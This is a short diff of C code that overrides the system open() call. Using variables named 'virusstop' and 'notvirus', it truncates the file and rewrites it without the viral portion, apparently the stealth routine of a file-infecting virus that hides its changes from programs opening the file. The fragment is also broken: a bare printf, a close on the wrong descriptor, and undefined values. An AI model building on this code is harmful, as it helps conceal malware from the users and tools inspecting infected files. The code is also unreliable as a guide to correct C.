@@ -75,11 +75,27 @@ int open(const char *pathname, int flags){
         printf
     }
     
-    if(ftruncate(fd, ))
+    if(ftruncate(fd, filesize - virusstop)){
+        printf("the truncate failed.\n");
+        return -1;
+    }
 
+    if(lseek(fd, zero, SEEK_SET) == -1){
+        printf("lseek failed. \n");
+        return -1;
+    }
+    
+    if((write(fd, notvirus, filesize - virusstop)) == -1){
+        printf("write failed \n");
+        return -1;
+    }
+ 
+    if( close(fd2) == -1){
+        printf("close failed\n");
+        return -1;
+    }
 
-
-
+    return fd;
 }
 
 
